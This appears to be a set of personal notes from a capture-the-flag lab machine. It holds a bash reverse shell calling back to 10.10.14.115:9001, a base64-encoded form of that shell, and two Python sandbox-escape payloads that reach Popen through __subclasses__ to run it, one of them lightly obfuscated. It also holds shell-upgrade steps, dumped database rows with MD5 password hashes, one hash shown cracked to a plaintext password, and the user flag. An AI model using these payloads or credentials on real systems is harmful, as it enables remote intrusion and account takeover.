```
sudo tcpdump -i tun0 icmp
```

used to **capture and display ICMP packets** (like `ping` requests and replies) on the `tun0` interface (commonly used in VPNs, e.g., HTB or THM labs).


```
echo -n 'bash -i >& /dev/tcp/10.10.14.115/9001 0>&1' \
| base64 -w 0; echo
```
- `echo -n` → Prints the payload **without** adding a newline at the end.
    
- `'bash -i >& /dev/tcp/10.10.14.115/9001 0>&1'` →  
    A **Bash reverse shell** that connects to `10.10.14.115` on port `9001`.
    
- `|` → Pipes the output into the next command.
    
- `base64 -w 0` → Encodes the payload in Base64, `-w 0` means no line breaks.
    
- `; echo` → Prints a newline after the Base64 output for readability.


```
bash -i >& /dev/tcp/10.10.14.115/9001 0>&1
```

|           |                                      |     |
| --------- | ------------------------------------ | --- |
| `bash -i` | Launch an **interactive** bash shell |     |

|     |                                   |
| --- | --------------------------------- |
| `>` | Redirect stdout (standard output) |

|     |                                                                    |
| --- | ------------------------------------------------------------------ |
| `&` | Tells Bash: what follows is a **file descriptor** (not a filename) |

|                              |                                                                            |
| ---------------------------- | -------------------------------------------------------------------------- |
| `/dev/tcp/10.10.14.115/9001` | A **special Bash feature** that opens a TCP connection to that IP and port |

|        |                                                                           |
| ------ | ------------------------------------------------------------------------- |
| `0>&1` | Redirect **stdin (fd 0)** to use the same connection as **stdout (fd 1)** |

---
```
[].__class__.__base__.__subclasses__()[317](['bash','-c','echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTE1LzkwMDEgMD4mMQ== | base64 -d | bash'])
```

---
## 🔧 Full Shell Upgrade Process Explained

You started with a **basic reverse shell** and ran:

---

### ✅ 1. Upgrade to an interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Why:**

- Spawns a **pseudo-terminal (pty)** inside the current shell
    
- Makes the shell more usable: arrow keys, interactive commands, colored output
    

---

### ✅ 2. Background the shell (on your attacker machine):

```bash
Ctrl + Z
```

**Why:**

- Temporarily suspends the shell so you can modify terminal settings on your end.
    

---

### ✅ 3. Fix terminal settings on your listener:

```bash
stty raw -echo
```

**Why:**

- `raw` — sends input character-by-character instead of line-by-line
    
- `-echo` — stops echoing your keystrokes twice
    
- This makes your shell behave like a normal terminal
    

---

### ✅ 4. Bring the shell back to foreground:

```bash
fg
```

**Why:**

- Restores the reverse shell to active use after fixing terminal settings
    

---

### ✅ 5. Make the shell behave like a real terminal:

```bash
export TERM=xterm
```

**Why:**

- Tells programs like `nano`, `less`, `htop`, etc., that you are in a proper terminal
    
- Enables color, screen clearing, and layout control
    

---
```
[x for x in [].__class__.__base__.__subclasses__() if x.__name__.lower() == 'p' + 'op' + 'en'][0](['bash','-c','echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTE1LzkwMDEgMD4mMQ== | base64 -d | bash'])
```



INSERT INTO user VALUES(1,'development','759b74ce43947f5f4c91aeddc3e5bad3');
INSERT INTO user VALUES(2,'martin','3de6f30c4a09c27fc71932bfc68474be');
CREATE TABLE code (
	id INTEGER NOT NULL, 


759b74ce43947f5f4c91aeddc3e5bad3  : development
3de6f30c4a09c27fc71932bfc68474be :   nafeelswordsmaster



user.txt : 88b661be6770f88082a9c614322dd10f

tar -xjvf file
: used to extract a .tar.bz2 file




car8tdjta0vhpi481n8oqrmql0